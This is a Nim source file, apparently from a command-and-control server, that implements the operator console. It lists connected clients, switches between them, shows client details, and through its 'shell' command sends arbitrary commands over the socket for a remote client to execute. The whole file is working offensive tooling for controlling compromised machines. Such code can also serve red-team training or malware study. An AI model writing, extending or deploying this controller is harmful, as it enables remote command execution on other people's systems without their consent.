import asyncdispatch, asyncnet, threadpool, asyncfutures
import strutils, terminal

import types, logging

proc procStdin*(server: C2Server, clResp: ref Future[void]) {.async.} =
  var handlingClient: int = -1

  prompt(handlingClient, server)
  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      let input = ^messageFlowVar
      let args = input.split(" ")
      let cmd = args[0]
      let argsn = len(args)

      case cmd:
        of "clients":
            for client in server.clients:
                if client.connected:
                    stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
                else:
                    stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
            infoLog $len(server.clients) & " clients currently connected"
        of "switch":
            for client in server.clients:
                if client.id == parseInt(args[1]):
                    handlingClient = parseInt(args[1])
                if handlingClient != parseInt(args[1]):
                    infoLog "client not found"
        of "info":
            for client in server.clients:
                if client.id == handlingClient:
                    echo @client
        of "shell":
            for client in server.clients:
                if client.id == handlingClient:
                    await client.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
                    if clResp[].isNil():
                        clResp[] = newFuture[void]()
                    await clResp[]
        of "back": 
            handlingClient = -1
        of "exit":
            quit(0)

      prompt(handlingClient, server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)
